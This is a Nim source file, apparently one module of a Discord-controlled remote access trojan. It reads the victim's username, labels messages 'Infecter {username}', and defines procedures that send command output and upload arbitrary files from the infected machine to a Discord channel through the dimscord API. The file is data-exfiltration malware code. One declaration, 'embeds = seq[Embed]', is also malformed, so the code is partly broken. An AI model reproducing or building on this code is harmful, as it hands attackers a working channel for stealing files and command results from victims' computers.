import asyncdispatch, dimscord, options, strformat, pcinformation

let pcInfor = PcInformation()
let username = pcInfor.username()

type Sender* = object
    api: RestApi
    channelId: string

proc sendOutput*(self: Sender, api: RestApi, channelId: string , output: string, format: bool = true): Future[Message] {.async.} =
    embeds = seq[Embed]
    if format:
        embeds = @[Embed(
                    title: some &"Infecter {username}",
                    description: some &"**__OUTPUT__**\n```\n{output}\n```",
                    color: some 0x7789ec
            )]
    else:
        embeds = @[Embed(
                    title: some &"Infecter {username}",
                    description: some output,
                    color: some 0x7789ec
        )]

    discard await api.sendMessage(
        channelId,
        embeds = embeds
    )

proc sendFiles*(self: Sender, api: RestApi, channelId: string , filePath: string): Future[Message] {.async.} =
    discard await api.sendMessage(
        channelId,
        "",
        files = @[DiscordFile(
            name: filePath
        )]
    )